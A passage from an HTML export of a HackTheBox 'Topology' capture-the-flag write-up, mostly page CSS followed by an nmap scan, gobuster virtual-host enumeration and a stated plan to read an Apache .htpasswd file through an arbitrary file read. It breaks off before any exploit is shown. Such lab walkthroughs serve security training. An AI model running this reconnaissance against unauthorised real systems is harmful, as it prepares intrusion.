@@ -1,0 +1,842 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HackTheBox - Topology (Easy)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="22ab633b-339b-4522-93a3-ed2cb53ef6c4" class="page mono"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/gradients_3.png" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/cbfa26b4a4044677e93779a44bbd458f.png"/></div><h1 class="page-title">HackTheBox - Topology (Easy)</h1><p class="page-description"></p></header><div class="page-body"><h1 id="c3b0b882-215f-45d2-8b92-d909d42f007e" class="">Table of contents</h1><nav id="2632d3ae-d263-4788-b039-68f792ee5f87" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c3b0b882-215f-45d2-8b92-d909d42f007e">Table of contents</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#4fa0de2f-f4fc-445a-a014-18798ca91184">Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c5993254-8112-4455-9c7b-c434db6b698a"><mark class="highlight-blue">Nmap scan</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#fc1bb5d5-7c78-4e87-aecc-7072af831c9a"><mark class="highlight-blue">Web enumeration</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#80d9dbe3-a11f-4028-85cc-c9b8757b4cb1">Initial access</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#9359a646-8841-40e6-817a-9016e80e0177">Post-exploitation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#bbc90d33-8187-4dde-a506-9165c9e1837d"><mark class="highlight-blue">Local enumeration</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#15618828-1a01-4bc7-9a70-9bc51a83982f"><mark class="highlight-blue">Privilege escalation</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#bc126190-9011-48df-bfdc-2de4a485411b">Clearing tracks</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#49bb7548-d466-4042-8882-31dcd9e11123">Vulnerabilities summary</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0f50dbd1-02e3-49f9-bf3f-a68e0779e774"><mark class="highlight-blue">Arbitrary File Read</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c57dfcd2-af3a-439d-b3ce-81d4bea0f672"><mark class="highlight-blue">Weak password</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#edbefe81-32b6-4157-9472-d31f797bd03b"><mark class="highlight-blue">Password reuse</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a82ceec0-7afe-43b7-ae05-c0d2d8147f8b"><mark class="highlight-blue">Gnuplot job misconfiguration</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#13df338f-8d68-4d27-aa6f-7e977557ffdd">Tools used</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1d304c86-af12-4e00-bbc1-c83a28d76854">Sources</a></div></nav><h1 id="4fa0de2f-f4fc-445a-a014-18798ca91184" class="">Enumeration</h1><h2 id="c5993254-8112-4455-9c7b-c434db6b698a" class=""><mark class="highlight-blue">Nmap scan</mark></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4eab6c5e-88d4-40f4-b845-93be24126209" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all"># Nmap 7.93 scan initiated Fri Jun 16 11:22:25 2023 as: nmap -A -p- -oN nmapResults.txt -T5 -v 10.10.11.217
+Nmap scan report for 10.10.11.217
+Host is up (0.026s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
+|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
+|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun 16 11:22:42 2023 -- 1 IP address (1 host up) scanned in 16.57 seconds</code></pre><h2 id="fc1bb5d5-7c78-4e87-aecc-7072af831c9a" class=""><mark class="highlight-blue">Web enumeration</mark></h2><p id="89a12953-420b-4290-b1f1-2cae6a10cfb5" class="">Let’s take a look at the website : </p><figure id="a3914bce-e1a5-436b-9a4b-3657f89dcc00" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled.png"><img style="width:989px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled.png"/></a></figure><p id="611ab642-cf0f-4605-b67d-e1968d07c222" class="">We have an email address which gives us a <mark class="highlight-yellow_background"><strong>potential username</strong></mark> (<mark class="highlight-yellow_background"><strong>lklein</strong></mark>) and a <mark class="highlight-yellow_background"><strong>domain name</strong></mark> (<mark class="highlight-yellow_background"><strong>topology.htb</strong></mark>).</p><p id="615bc11c-84fa-4ba1-9848-d5d770a6a9bf" class="">Also, there is a hyperlink (<mark class="highlight-yellow_background"><strong>LaTeX Equation Generator</strong></mark>) that redirects us to <mark class="highlight-yellow_background"><strong>http://latex.topology.htb/equation.php</strong></mark>. </p><p id="51f4d115-9f6c-4fe5-989b-a7e91805a4fc" class="">Let’s add the domain and the virtual host we just found to our <mark class="highlight-yellow_background"><strong>/etc/hosts</strong></mark> file : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9e6829bf-c912-41a4-8d26-6d08be9fdac8" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat /etc/hosts
+127.0.0.1       localhost       gitea.searcher.htb
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.217    topology.htb    latex.topology.htb</code></pre><p id="a810ebf4-e56c-49fc-8c11-4480c0d61394" class="">Let’s enumerate other <mark class="highlight-yellow_background"><strong>virtual hosts</strong></mark> using <a href="https://github.com/OJ/gobuster"><strong>Gobuster</strong></a> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8f752fe7-accb-4517-87ef-f16848746782" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ gobuster vhost -u http://topology.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://topology.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.5
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/06/17 08:17:03 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: dev.topology.htb Status: 401 [Size: 463]
+Found: stats.topology.htb Status: 200 [Size: 108]</code></pre><p id="b886fb77-5029-4f47-ba57-70addf6e7b40" class="">We found two other virtual hosts. Let’s add them to our <mark class="highlight-yellow_background"><strong>/etc/hosts</strong></mark> file : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d31c8099-9523-4651-88f7-4c1d20ecf27e" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat /etc/hosts
+127.0.0.1       localhost       gitea.searcher.htb
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.217    topology.htb    latex.topology.htb      dev.topology.htb        stats.topology.htb</code></pre><p id="8ee159d8-c6a5-4ac1-a476-c6c0be9c4f3a" class="">The second one does not seems to be useful for an attacker. But the first one (<mark class="highlight-yellow_background"><strong>dev.topology.htb</strong></mark>) requires us to authenticate using a <mark class="highlight-yellow_background"><strong>Basic Authentication</strong></mark> : </p><figure id="c375ba72-d748-46b3-8a99-a7166a5244e6" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%201.png"><img style="width:1278px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%201.png"/></a></figure><p id="27979dbc-33c0-4240-b085-2ba4d7f3ea52" class="">The credentials for basic authentication on an Apache webserver are commonly found in the <mark class="highlight-yellow_background"><strong>.htpasswd</strong></mark> file at the root of the virtual host. If we want to find credentials for this virtual host, we will need to find a way to read arbitrary files on the web server.</p><p id="59a52e8b-83d8-472c-b8ec-37c4ca0477ca" class="">Let’s take a look at <mark class="highlight-yellow_background"><strong>http://latex.topology.htb/equation.htb</strong></mark> : </p><figure id="d1b90f56-4c33-4511-b678-d6aa09ccd393" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%202.png"><img style="width:799px" 